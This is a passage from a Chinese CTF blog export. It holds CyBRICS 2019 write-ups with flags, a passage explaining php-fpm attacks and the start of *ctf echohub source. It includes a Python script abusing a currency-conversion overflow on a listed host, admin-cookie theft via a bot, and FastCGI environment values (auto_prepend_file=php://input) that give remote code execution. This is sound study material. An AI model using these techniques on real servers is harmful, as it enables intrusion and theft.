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--J2SCkAp4GZ/dPZZf--. 解密一下这串base64可以看到很明显是压缩包，压缩包密码就是crack0Weston88vertebra，解压一下就可以拿到一个pdf，内容是cybrics{Y0uV3_G0T_m41L}，就是flag了 Honey, Help!这个题目拿到一张图片很明显可以知道echo $&#39;\\e(0‘以后是ls -la，然后下一个命令是cat flag然后将拿到的txt文件放进去十六进制编辑器去对照出来一个字母表，连猜带蒙对应着写出flag12345678910111213141516171819202122232425262728293031323334353637383940414243E2 90 8C cE2 89 A4 yE2 90 89 bE2 8E BC rE2 90 8B iE2 90 8C cE2 8E BD sCF 80 &#123;E2 90 A4 h30 0E2 94 8C l E2 89 A4 y5F _E2 90 8C cE2 8E BC r34 4E2 8E BB p5F _31 1E2 8E BD s5F _E2 94 9C tE2 90 A4 hE2 90 8B iE2 8E BD s5F _E2 96 92 aE2 94 8C l31 133 3E2 94 BC nE2 90 8B i24 $E2 90 A4 h5F _30 0E2 8E BC r5F _E2 94 AC w34 4E2 94 9C t3F ?C2 A3 &#125; 赛后才想到可以自己打这个命令去弄出一个字母表，对照就行 NopeSQL这个网站后台数据库是mongo，尝试一下登录进去进去以后能看到一些信息接下来我们就是读flag了 Tone题目是12Ha! Looks like this guy forgot to turn off his video stream and entered his password on his phone!youtu.be/11k0n7TOYeM 这个音频里面的音调系统是DTMF，我们先去找那个对应的音频系统然后就是去下载m4a文件用Audacity打开，进行频谱分析（选好音频区间，分析，频谱分析）然后对应两个最高点读赫兹，接着对应码表解出数字最后读出来的密码是222 999 22 777 444 222 7777 7777 33 222 777 33 8 8 666 66 2 555 333 555 2 4，到了这里就是手机键盘加密解密了，有一种手机键盘密码（九宫格）是数字对应键盘上面的字母，有几个字母就是第几个字母，也是就2=A 22=B 222=C 3=D 33=E 333=F，以此类推，所以翻译出来就是cybricssecrettonalflag，也就是cybrics{secrettonalflag} Caesaref这个网站是一个写留言的网站，一开始我以为是xss，打了一堆过去都不能打过去，自闭了，后来发现直接在留言框里面输入网址bot就会访问过去，然后就能拿到管理员的cookie，换一下就能拿到flag了 Zakukozh这是一个仿射密码，就是一种替换密码，公式如下E(x) = [(a*x) + b] % m，x是明文，a、b和m分别是选定的用来加密的数字，E(x)是密文，解密公式则是d(x) = a^(-1) * (x-b)，而a^(-1)是a的逆元，题目的bin文件提取出来的东西就是密文，结合题目我们可以知道，原文字符是图片，图片文件头有几种123JPEG: ff d8 ff e0 xx xx 4a 46 49 46GIF: 47 49 46 38 39 61PNG: 89 50 4e 47 0d 0a 1a 0a 再接下来就是列方程尝试哪个可以进行解密，因为bin文件里面最大的数字是0xff，所以我们可以猜测m=0x100，最后尝试出来是jpg文件，解方程解出来12a^(-1) = 239b = 0x59 最后解密的脚本就是1234567891011121314from pwn import *import gmpy2p = open('zakukozh','rb')f = open('res','wb+')a = p.read(1)while a: a = ord(a) temp = (239*(a-0x59))%0x100 print hex(temp) # print len(hex(temp)) # pause() f.write((hex(temp)[2:]) + '\\n') a = p.read(1)print \"OK\" Bitkoff Bank这个是一个转化钱的银行，可以买股票，也可以转化钱，而买股票再抛出只能获得0.0000000001usb，但是买flag需要1usd，而转化钱这里有个溢出漏洞，我们抓包转化一下钱，可以获得多一点钱，我们可以先疯狂买股票抛股票攒一点钱，然后就写脚本不断将usb转成btc或者将btc转成usb1234567891011121314151617181920212223242526272829import requestsimport timeurl = \"http://95.179.148.72:8083/index.php\"cookie = &#123; \"name\": \"Ariel\", \"password\": \"123\"&#125;data1 = &#123; \"from_currency\": \"btc\", \"to_currency\": \"usd\", \"amount\": 0.0000368417&#125;data2 = &#123; \"from_currency\": \"usd\", \"to_currency\": \"btc\", \"amount\": 0.401781&#125;j = 0for i in range(500): j+=1 if(j%10 == 0): time.sleep(2) res1 = requests.post(url=url, cookies=cookie, data=data1).text print \"[+]1-----: \" + str(res1)[0:60] res2 = requests.post(url=url, cookies=cookie, data=data2).text print \"[+]2-----: \" + str(res2)[0:60] 最后买个flag就行 Big RAM题目如下12We heard that substitution ciphers are easy to crack with frequency analysis. Especially for English texts! This one, however, doesn’t map same letters to same letters, so it should be unbreakable.We even encrypted an entire book with it. Inside this book, we keep the flag. 我们解压压缩包可以拿到两个文件，一个encoder_decoder.py，另一个是book.enc，在book.enc里面有个xanjtou{sw_p_aqws_oefnehyh_jyiq_zw_qczoa_ybwrgzsbmu}，但是我们看到题目说了他会将相同的字符加密成不同的字符，所以如果我们想直接对应翻译出来是不行的，接下来就是看另一个encoder_decoder.py文件在python文件里面我们可以看见它只对大写字母和小写字母进行加密，加密字符串还很多，结合题目我们可以用频率分析去对应出字母，因为在我们使用英文的时候，字母里面的有一些字符用的频率特别多，比如英文里，出现最多的是字母e，但是题目说了，同样的字母翻译过来的字母是不一样的，因此，他对应的可能是多个字符的对应翻译，比如是ab=&gt;ec这样，因此这个难度就大得多了接下来先找常见的双字母组合12345678910111213th 1.52 en 0.55 ng 0.18he 1.28 ed 0.53 of 0.16in 0.94 to 0.52 al 0.09er 0.94 it 0.50 de 0.09an 0.82 ou 0.50 se 0.08re 0.68 ea 0.47 le 0.08nd 0.63 hi 0.46 sa 0.06at 0.59 is 0.46 si 0.05on 0.57 or 0.43 ar 0.04nt 0.56 ti 0.34 ve 0.04ha 0.56 as 0.33 ra 0.04es 0.56 te 0.27 ld 0.02st 0.55 et 0.19 ur 0.02 我们拿原来题目的脚本改一下，来求出当前的频率进行对比，脚本如下123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566#!/usr/bin/pythonimport sys, hashlib, random, itertools, string, reif len(sys.argv) &lt;= 4 or (sys.argv[1] != \"enc\" and sys.argv[1] != \"dec\"): print (\"USAGE:\") print (\"%s &#123;enc|dec&#125; key input.txt output.txt\"%sys.argv[0]) exit(1)_, mode, key, inputFile, outputFile = sys.argv## 初始化key = hashlib.sha256(key).hexdigest()random.seed(int(key, 16))## 字母映射plain1 = list(string.ascii_lowercase)crypt1 = plain1[:]random.shuffle(crypt1)## 双字母映射plain2 = [''.join(x) for x in itertools.product(string.ascii_lowercase, string.ascii_lowercase)]crypt2 = plain2[:]random.shuffle(crypt2)## if decrypting, replace in the other directionif mode == \"dec\": plain1, crypt1 = crypt1, plain1 plain2, crypt2 = crypt2, plain2map1 = dict(zip(plain1, crypt1))map2 = dict(zip(plain2, crypt2))freq = &#123;&#125;def transform(s): s = s.group(0) res = \"\" for i in range(0, len(s), 2): chunk = s[i:i+2] if chunk.lower() not in freq: freq[chunk.lower()] = 1 else: freq[chunk.lower()] += 1 ## 双字母 if len(chunk) == 2: ciph = map2[chunk.lower()] if chunk[0] == chunk[0].upper(): ciph = ciph[0].upper() + ciph[1] if chunk[1] == chunk[1].upper(): ciph = ciph[0] + ciph[1].upper() ## 单数字母 elif len(chunk) == 1: ciph = map1[chunk.lower()] if chunk == chunk.upper(): ciph = ciph.upper() res += ciph return res## 记录结果text = open(sys.argv[3], \"rb\").read()text = re.sub(r'[a-z]+', transform, text, 0, re.I)open(sys.argv[4], \"wb\").write(text)out = open('freq.txt', \"wb\")for item in sorted(freq.items(), key=lambda x: x[1], reverse=True): out.write('%s, %d\\n' % (item[0], item[1])) 运行python freq.py enc anypassword book.enc freq.txt，接着查看结果，大致如下1234567891011yb, 12610n, 11822x, 7827s, 7262u, 6012ow, 5406wr, 5119jo, 3736jy, 3726cd, 3615...... 可以看到yb的频率远远高于其他字母出现的频率，因此我们可以先大致确定yb=&gt;th但是还有一个问题，由于字母的元组对应可以是一对一、一对多和多对多，因此我们在解码的时候会面临一字多解的问题，接下来就需要再利用原来给的encode脚本去加密对比来帮助我们更好地进行解密了具体操作如下，首先我们可以先拿一个文字进行加密，例如用anypassword去加密book.enc，命令python encoder_decoder.py enc anypassword book.enc book2.enc","comments":true,"permalink":"https://xi4or0uji.github.io/2019/07/22/CyBRICS-CTF-Quals-2019-wp/","categories":[{"name":"CTF","slug":"CTF","permalink":"https://xi4or0uji.github.io/categories/CTF/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://xi4or0uji.github.io/tags/CTF/"}]},{"title":"php-fpm","date":"2019-07-10T16:00:00.000Z","path":"2019/07/11/php-fpm/","text":"前言前段时间不是出题就是给队内wiki整理资料，自己学习倒是懒了下来，摸了摸了，回头看来一下之前在比赛碰到几次，但是还没深入研究的，总结一下做个笔记 概念官方对它的定义是FastCGI 进程管理器（FPM），用来替换PHP FastCGI的大部分附加功能，缓解高负荷网站的压力，具体解释可见官网https://www.php.net/manual/zh/install.fpm.php那么问题来了，fastcgi又是什么呢？其实phper肯定都用过它，只不过可能没有深入去了解而已 Fastcgi它其实就是一个通信协议，跟http那些一样的，都是进行数据交换的一种通道我们都知道http协议是浏览器和服务器中间件进行数据交换用的协议，类似的，fastcgi就是服务器中间件和某个语言的后端进行数据交换所使用的协议了，和http协议一样，fastcgi协议也是有消息头和消息体的为什么会有这个协议呢？一开始服务器只需要处理html那些静态的页面，但是随着时间的发展，出现了php那些动态的语言，所以就需要解释器了，可是解释器怎么跟服务器进行通信呢，于是就出现了cgi协议，可是后来的网站越做越大，服务器每次收到一个请求都需要去fork一个cgi进程，占用资源太大，于是就出现了改良版本，就是fastcgi，每次处理完请求后，不会kill掉这一个进程，继续保留这个进程，让这个进程一次处理多个请求但是需要注意一点，Apache把PHP作为一个模块集成到Apache的进程（httpd）中运行，这种mod_php的运行模式运用的不是php-cgi，而Nginx服务器则是通过fastcgi进行php通信的 消息头主要消息头有1234Version: 用于表示 FastCGI 协议版本号。Type: 用于标识 FastCGI 消息的类型 - 用于指定处理这个消息的方法。RequestID: 标识出当前所属的 FastCGI 请求。Content Length: 数据包包体所占字节数。 消息类型123456BEGIN_REQUEST: 从 Web 服务器发送到 Web 应用，表示开始处理新的请求。ABORT_REQUEST: 从 Web 服务器发送到 Web 应用，表示中止一个处理中的请求。比如，用户在浏览器发起请求后按下浏览器上的「停止按钮」时，会触发这个消息。END_REQUEST: 从 Web 应用发送给 Web 服务器，表示该请求处理完成。返回数据包里包含「返回的代码」，它决定请求是否成功处理。PARAMS: 「流数据包」，从 Web 服务器发送到 Web 应用。此时可以发送多个数据包。发送结束标识为从 Web 服务器发出一个长度为 0 的空包。且 PARAMS 中的数据类型和 CGI 协议一致。即我们使用 $_SERVER 获取到的系统环境等。STDIN: 「流数据包」，用于 Web 应用从标准输入中读取出用户提交的 POST 数据。STDOUT: 「流数据报」，从 Web 应用写入到标准输出中，包含返回给用户的数据。 交互过程既然上面都讲了那就顺便把交互过程也讲了（菜鸡好啰嗦啊……..1234首先，虽然服务器收到用户的请求，但是请求的处理都是交给web应用完成的。服务器会尝试通过套接字（unix或tcp）连接到fastcgi进程。 fastcgi进程查看接收到的连接，选择是接收还是拒绝连接，接收的话就去标准流中读数据包。 如果fastcgi进程在指定的时间没有成功接收到连接，，在请求失败，否则服务器发送一个包含唯一的RequestID的BEGIN_REQUEST类型的信息给fastcgi进程，通过这一个id去区别该请求，然后，服务器发送任意数量的PARAMS类型信息到fastcgi进程，发送完毕的时候发个空的PARAMS进行确认和关闭流。同时，如果用户发送了POST数据的话，服务器会将它写进标准流发给fastcgi进程，当POST数据发送完时，也是发送一个空的STDIN来关闭流。 当fastcgi进程在接收到BEGINREQUEST类型的数据包时，可以通过响应ENDREQUEST去拒绝这个请求，也可以接收和处理它。如果接收，fastcgi进程就会将等待接收的所有的PARAMS和STADIN，处理请求并将返回的结果写进STDOUT，处理完成后，发个空包去关闭流，同时发个END_REQUEST类型的信息给服务器，告诉他是否发生错误异常。 php-fpm介绍了fastcgi，那么php-fpm又是什么呢？其实就是一个fastcgi协议的解析器，Nginx等服务器的中间件将用户请求按照fastcgi规则打包好后通过tcp传给的就是php-pfm过程如下：fpm进程包含master进程和worker进程，master进程负责监听，而worker进程嵌入了php解释器，负责处理php代码 tcp模式下的php-fpm未授权访问攻击因为fpm对两个进程通信没有安全性验证，所以如果我们伪造一个fastcgi规则封装的数据给fpm解析的话，自然他也是会进行解析的，所以这个时候就可以造成任意代码执行漏洞了我们先看fastcgi协议封装的数据格式123456789101112131415typedef struct &#123; /* Header */ unsigned char version; // 标识fastcgi协议版本 unsigned char type; // 本次record的类型 unsigned char requestIdB1; // 本次record对应的请求id unsigned char requestIdB0; unsigned char contentLengthB1; // body体的大小 unsigned char contentLengthB0; unsigned char paddingLength; // 额外块大小 unsigned char reserved; /* Body */ unsigned char contentData[contentLength]; unsigned char paddingData[paddingLength];&#125; FCGI_Record; php解释器解析了fastcgi头以后，拿到了contentLenght，然后在tcp流里面读大小等于contentLength的数据，就拿到body的内容至于padding，则是由paddingLenght去指定长度的，若不需要padding，则将paddingLength置为0而type则要看下图当type设置为4的时候，设置环境变量的请求中就会有如下值：12345678910111213141516&#123; 'GATEWAY_INTERFACE': 'FastCGI/1.0', 'REQUEST_METHOD': 'GET', 'SCRIPT_FILENAME': '/var/www/html/index.php', 'SCRIPT_NAME': '/index.php', 'QUERY_STRING': '?a=1&amp;b=2', 'REQUEST_URI': '/index.php?a=1&amp;b=2', 'DOCUMENT_ROOT': '/var/www/html', 'SERVER_SOFTWARE': 'php/fcgiclient', 'REMOTE_ADDR': '127.0.0.1', 'REMOTE_PORT': '12345', 'SERVER_ADDR': '127.0.0.1', 'SERVER_PORT': '80', 'SERVER_NAME': \"localhost\", 'SERVER_PROTOCOL': 'HTTP/1.1'&#125; php-fpm会执行SCRIPT_FILENAME所指的文件，但是php5以后fpm增加了security.limit_extensions的选项，导致我们只能控制php-fpm执行php文件1234567; Limits the extensions of the main script FPM will allow to parse. This can; prevent configuration mistakes on the web server side. You should only limit; FPM to .php extensions to prevent malicious users to use other extensions to; exectute php code.; Note: set an empty value to allow all extensions.; Default Value: .php;security.limit_extensions = .php .php3 .php4 .php5 .php7 现在我们可以控制任意一个php文件，但是内容还不是我们能可控制的额，这就要用到另一个参数了，fastcgi会将SCRIPT_FILENAME的文件交给worker进程解析，这个过程是没有办法控制变量的，但是php-fpm可以设置环境变量12'PHP_VALUE': 'auto_prepend_file = php://input','PHP_ADMIN_VALUE': 'allow_url_include = On' 先去看一眼php配置手册所以我们按照如上方法设置环境变量的话，就能让php脚步执行php://input的值，因此我们就能就行任意代码执行了，那么恶意的数据放在哪呢，当然就是在fastcgi协议的body里面了讲到这里，接下来我们就是要去写脚本了原理其实就是写一个fastcgi的客户端，然后修改发送数据成恶意代码就行菜鸡搭了半天docker搭不起来，最后只能用官方的php-fpm镜像去搭建了接下来就用ph牛的脚本打过去 unix套接字模式下的php-fpm攻击既然tcp模式下可以进行php-fpm攻击，那么我们尝试一下unix套接字模式下是否可以进行攻击呢这个知识点直接用一个例题进行讲解，就是*ctf的echohub试一下url/?source=1可以拿到源码但是解码出来是乱码，其实就是一个混淆脚本大佬们都是ida直接动态调试出来，菜鸡太菜了，只能找个解密网站将它解密，出来源码是这样的123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145&lt;?phprequire_once 'sandbox.php';$seed = time();srand($seed);define(\"INS_OFFSET\",rand(0x0000,0xffff));$regs = array( 'eax'=&gt;0x0, 'ebp'=&gt;0x0, 'esp'=&gt;0x0, 'eip'=&gt;0x0,);function aslr(&amp;$value,$key)&#123; $value = $value + 0x60000000 + INS_OFFSET + 1 ;&#125;$func_ = array_flip($func);array_walk($func_,\"aslr\");$plt = array_flip($func_);function handle_data($data)&#123; $data_len = strlen($data); $bytes4_size = $data_len/4+(1*($data_len%4)); $cut_data = str_split($data,4); $cut_data[$bytes4_size-1] = str_pad($cut_data[$bytes4_size-1],4,\"\\x00\"); foreach ($cut_data as $key=&gt;&amp;$value)&#123; $value = strrev(bin2hex($value)); &#125; return $cut_data;&#125;function gen_canary()&#123; $chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHJKLMNPQEST123456789'; $c_1 = $chars[rand(0,strlen($chars)-1)]; $c_2 = $chars[rand(0,strlen($chars)-1)]; $c_3 = $chars[rand(0,strlen($chars)-1)]; $c_4 = \"\\x00\"; return handle_data($c_1.$c_2.$c_3.$c_4)[0];&#125;$canary = gen_canary();$canarycheck = $canary;function check_canary()&#123; global $canary; global $canarycheck; if($canary != $canarycheck)&#123; die(\"emmmmmm...Don't attack me!\"); &#125;&#125;Class stack&#123; private $ebp,$stack,$esp; public function __construct($retaddr,$data) &#123; $this-&gt;stack = array(); global $regs; $this-&gt;ebp = &amp;$regs['ebp']; $this-&gt;esp = &amp;$regs['esp']; $this-&gt;ebp = 0xfffe0000 + rand(0x0000,0xffff); global $canary; $this-&gt;stack[$this-&gt;ebp - 0x4] = &amp;$canary; $this-&gt;stack[$this-&gt;ebp] = $this-&gt;ebp + rand(0x0000,0xffff); $this-&gt;esp = $this-&gt;ebp - (rand(0x20,0x60)*4); $this-&gt;stack[$this-&gt;ebp + 0x4] = dechex($retaddr); if($data != NULL) 